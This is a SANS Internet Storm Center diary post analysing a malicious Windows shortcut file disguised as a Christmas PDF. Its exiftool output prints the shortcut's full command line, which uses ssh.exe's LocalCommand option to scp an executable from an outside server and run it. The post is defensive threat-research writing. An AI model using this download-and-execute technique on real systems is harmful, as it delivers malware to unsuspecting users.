---
title: Christmas "Gift" Delivered Through SSH, (Fri, Dec 20th)
url: https://isc.sans.edu/diary/rss/31538
source: SANS Internet Storm Center, InfoCON: green
date: 2024-12-21
fetch_date: 2025-10-06T19:41:43.144174
---

# Christmas "Gift" Delivered Through SSH, (Fri, Dec 20th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/31530)
* [next](/diary/31540)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

# [Christmas "Gift" Delivered Through SSH](/forums/diary/Christmas%2BGift%2BDelivered%2BThrough%2BSSH/31538/)

**Published**: 2024-12-20. **Last Updated**: 2024-12-20 11:01:29 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[1 comment(s)](/diary/Christmas%2BGift%2BDelivered%2BThrough%2BSSH/31538/#comments)

Christmas is at our doors and Attackers use the holiday season to deliver always more and more gifts into our mailboxes! I found this interesting file this morning: "christmas\_slab.pdf.lnk"[[1](https://www.virustotal.com/gui/file/8bd210b33340ee5cdd9031370eed472fcc7cae566752e39408f699644daf8494/details)]. Link files (.lnk) are a classic way to execute something malicious on the victim's computer but the technique used here is interesting.

For a while, Microsoft added SSH support to Windows. I remember the first time I typed "ssh" into a command line and I did not get the wonderful message:

```

'ssh' is not recognized as an internal or external command
```

Because ssh is avaiable on many computers today, Attackers have a new way to deliver more malicious content using the SSH (read: SCP) protocol. That's the technique used by today's LNK file:

```

remnux@remnux:/MalwareZoo/20241220$ exiftool christmas_slab.pdf.lnk
ExifTool Version Number         : 12.76
File Name                       : christmas_slab.pdf.lnk
Directory                       : .
File Size                       : 1992 bytes
File Modification Date/Time     : 2024:12:20 05:39:50-05:00
File Access Date/Time           : 2024:12:20 05:39:50-05:00
File Inode Change Date/Time     : 2024:12:20 05:39:50-05:00
File Permissions                : -rwx------
File Type                       : LNK
File Type Extension             : lnk
MIME Type                       : application/octet-stream
Flags                           : IDList, LinkInfo, RelativePath, WorkingDir, CommandArgs, Unicode, TargetMetadata
File Attributes                 : Archive
Create Date                     : 2024:10:09 05:37:10-04:00
Access Date                     : 2024:11:05 07:47:23-05:00
Modify Date                     : 2024:10:09 05:37:10-04:00
Target File Size                : 1243648
Icon Index                      : (none)
Run Window                      : Normal
Hot Key                         : (none)
Target File DOS Name            : ssh.exe
Drive Type                      : Fixed Disk
Drive Serial Number             : 280C-1822
Volume Label                    :
Local Base Path                 : C:\Windows\System32\OpenSSH\ssh.exe
Relative Path                   : ..\..\..\Windows\System32\OpenSSH\ssh.exe
Working Directory               : C:\Program Files (x86)\Microsoft\Edge\Application
Command Line Arguments          : -o "PermitLocalCommand=yes" -o "StrictHostKeyChecking=no" -o "LocalCommand=scp root@17[.]43[.]12[.]31:/home/revenge/christmas-sale.exe c:\users\public\. && c:\users\public\christmas-sale.exe" revenge@17[.]43[.]12[.]31
Machine ID                      : christmas-destr
```

This LNK file will spawn a ssh.exe that will transfer a PE file and execute it. Note the nice executable filename! Once started, the same IP address + username is passed as a parameter to the malicious payload. Unfortunately, the SSH server is down and I wasn't able to retried the file.

Somethign else suspicious, the IP belows to Apple:

```

NetRange:       17.0.0.0 - 17.255.255.255
CIDR:           17.0.0.0/8
NetName:        APPLE-WWNET
NetHandle:      NET-17-0-0-0-1
Parent:          ()
NetType:        Direct Allocation
OriginAS:
Organization:   Apple Inc. (APPLEC-1-Z)
RegDate:        1990-04-16
Updated:        2023-11-15
Comment:        Geofeed https://ip-geolocation.apple.com
Ref:            https://rdap.arin.net/registry/ip/17.0.0.0
```

I discovered this file because I started to track the usage of "ssh.exe" in my hunting rules. Let's hope I will get more hits soon!

[1] <https://www.virustotal.com/gui/file/8bd210b33340ee5cdd9031370eed472fcc7cae566752e39408f699644daf8494/details>

Xavier Mertens (@xme)
Xameco
Senior ISC Handler - Freelance Cyber Security Consultant
[PGP Key](https://keybase.io/xme/key.asc)

Keywords: [Linkfile](/tag.html?tag=Linkfile) [LNK](/tag.html?tag=LNK) [Gift](/tag.html?tag=Gift) [Christmas](/tag.html?tag=Christmas) [Malware](/tag.html?tag=Malware) [Windows](/tag.html?tag=Windows) [SSH](/tag.html?tag=SSH)

[1 comment(s)](/diary/Christmas%2BGift%2BDelivered%2BThrough%2BSSH/31538/#comments)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

* [previous](/diary/31530)
* [next](/diary/31540)

### Comments

[Login here to join the discussion.](/login)

Top of page

×

![modal content]()

[Diary Archives](/diaryarchive.html)

* [![SANS.edu research journal](https://isc.sans.edu/images/researchjournal5.png)](/j/research)
* [Homepage](/index.html)
* [Diaries](/diaryarchive.html)
* [Podcasts](/podcast.html)
* [Jobs](/jobs)
* [Data](/data)
  + [TCP/UDP Port Activity](/data/port.html)
  + [Port Trends](/data/trends.html)
  + [SSH/Telnet Scanning Activity](/data/ssh.html)
  + [Weblogs](/weblogs)
  + [Domains](/data/domains.html)
  + [Threat Feeds Activity](/data/threatfeed.html)
  + [Threat Feeds Map](/data/threatmap.html)
  + [Useful InfoSec Links](/data/links.html)
  + [Presentations & Papers](/data/presentation.html)
  + [Research Papers](/data/researchpapers.html)
  + [API](/api)
* [Tools](/tools/)
  + [DShield Sensor](/howto.html)
  + [DNS Looking Glass](/tools/dnslookup)
  + [Honeypot (RPi/AWS)](/tools/honeypot)
  + [InfoSec Glossary](/tools/glossary)
* [Contact Us](/contact.html)
  + [Contact Us](/contact.html)
  + [About Us](/about.html)
  + [Handlers](/handler_list.html)* [About Us](/about.html)

[Slack Channel](/slack/index.html)

[Mastodon](https://infosec.exchange/%40sans_isc)

[Bluesky](https://bsky.app/profile/sansisc.bsky.social)

[X](https://twitter.com/sans_isc)

![](/adimg.html?id=)

© 2025 SANS™ Internet Storm Center
Developers: We have an [API](/api/) for you!   [![Creative Commons License](/images/cc.png)](https://creativecommons.org/licenses/by-nc-sa/4.0/)

* [Link To Us](/linkback.html)
* [About Us](/about.html)
* [Handlers](/handler_list.html)
* [Privacy Policy](/privacy.html)